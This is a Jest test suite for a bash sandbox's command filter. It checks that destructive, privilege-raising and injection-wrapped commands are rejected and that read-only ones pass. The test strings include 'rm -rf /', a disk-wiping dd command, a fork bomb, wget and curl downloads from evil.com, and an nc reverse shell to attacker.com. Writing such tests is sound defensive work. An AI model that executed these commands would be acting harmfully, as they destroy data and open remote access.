import { isCommandAllowed } from "@security/sandbox";

describe("Bash Sandbox Security", () => {
  describe("Basic denylist checks", () => {
    it("should block rm command", () => {
      expect(isCommandAllowed("rm -rf /")).toBe(false);
      expect(isCommandAllowed("rm file.txt")).toBe(false);
    });

    it("should block sudo command", () => {
      expect(isCommandAllowed("sudo apt-get install")).toBe(false);
      expect(isCommandAllowed("sudo rm file")).toBe(false);
    });

    it("should block shutdown command", () => {
      expect(isCommandAllowed("shutdown now")).toBe(false);
      expect(isCommandAllowed("shutdown -h now")).toBe(false);
    });

    it("should block reboot command", () => {
      expect(isCommandAllowed("reboot")).toBe(false);
      expect(isCommandAllowed("reboot now")).toBe(false);
    });

    it("should block mkfs command", () => {
      expect(isCommandAllowed("mkfs.ext4 /dev/sda1")).toBe(false);
    });

    it("should block fork bomb", () => {
      expect(isCommandAllowed(":(){:|:&};:")).toBe(false);
    });
  });

  describe("Case sensitivity bypass attempts", () => {
    it("should block uppercase RM", () => {
      expect(isCommandAllowed("RM -rf /")).toBe(false);
    });

    it("should block mixed case Sudo", () => {
      expect(isCommandAllowed("Sudo apt-get install")).toBe(false);
    });

    it("should block SHUTDOWN", () => {
      expect(isCommandAllowed("SHUTDOWN now")).toBe(false);
    });

    it("should block Reboot", () => {
      expect(isCommandAllowed("Reboot")).toBe(false);
    });
  });

  describe("Command injection attempts", () => {
    it("should block rm hidden in command substitution", () => {
      expect(isCommandAllowed("echo $(rm file.txt)")).toBe(false);
    });

    it("should block rm in backticks", () => {
      expect(isCommandAllowed("echo `rm file.txt`")).toBe(false);
    });

    it("should block rm after semicolon", () => {
      expect(isCommandAllowed("ls; rm file.txt")).toBe(false);
    });

    it("should block rm after pipe", () => {
      expect(isCommandAllowed("ls | rm file.txt")).toBe(false);
    });

    it("should block rm after AND operator", () => {
      expect(isCommandAllowed("ls && rm file.txt")).toBe(false);
    });

    it("should block rm after OR operator", () => {
      expect(isCommandAllowed("ls || rm file.txt")).toBe(false);
    });
  });

  describe("Path-based dangerous commands", () => {
    it("should block /bin/rm", () => {
      expect(isCommandAllowed("/bin/rm file.txt")).toBe(false);
    });

    it("should block /usr/bin/sudo", () => {
      expect(isCommandAllowed("/usr/bin/sudo ls")).toBe(false);
    });
  });

  describe("Whitespace evasion attempts", () => {
    it("should block rm with extra spaces", () => {
      expect(isCommandAllowed("rm  file.txt")).toBe(false);
    });

    it("should block rm with tabs", () => {
      expect(isCommandAllowed("rm\tfile.txt")).toBe(false);
    });
  });

  describe("Additional dangerous commands blocked by whitelist", () => {
    it("should block dd (disk destroyer)", () => {
      expect(isCommandAllowed("dd if=/dev/zero of=/dev/sda")).toBe(false);
    });

    it("should block wget to overwrite files", () => {
      expect(isCommandAllowed("wget http://evil.com/malware -O /tmp/exploit")).toBe(false);
    });

    it("should block curl to overwrite files", () => {
      expect(isCommandAllowed("curl http://evil.com/malware -o /tmp/exploit")).toBe(false);
    });

    it("should block chmod", () => {
      expect(isCommandAllowed("chmod 777 /etc/passwd")).toBe(false);
    });

    it("should block chown", () => {
      expect(isCommandAllowed("chown root:root file")).toBe(false);
    });

    it("should block kill", () => {
      expect(isCommandAllowed("kill -9 1")).toBe(false);
    });

    it("should block nc/netcat for reverse shells", () => {
      expect(isCommandAllowed("nc -e /bin/bash attacker.com 4444")).toBe(false);
    });

    it("should block mv (file moves)", () => {
      expect(isCommandAllowed("mv file.txt /tmp/")).toBe(false);
    });

    it("should block cp (file copies)", () => {
      expect(isCommandAllowed("cp file.txt /tmp/")).toBe(false);
    });

    it("should block touch (file creation)", () => {
      expect(isCommandAllowed("touch newfile.txt")).toBe(false);
    });

    it("should block mkdir", () => {
      expect(isCommandAllowed("mkdir malicious")).toBe(false);
    });
  });

  describe("Safe commands that should be allowed", () => {
    it("should allow ls", () => {
      expect(isCommandAllowed("ls -la")).toBe(true);
    });

    it("should allow pwd", () => {
      expect(isCommandAllowed("pwd")).toBe(true);
    });

    it("should allow echo", () => {
      expect(isCommandAllowed("echo hello")).toBe(true);
    });

    it("should allow cat", () => {
      expect(isCommandAllowed("cat file.txt")).toBe(true);
    });

    it("should allow grep", () => {
      expect(isCommandAllowed("grep pattern file.txt")).toBe(true);
    });

    it("should allow find", () => {
      expect(isCommandAllowed("find . -name '*.txt'")).toBe(true);
    });
  });
});
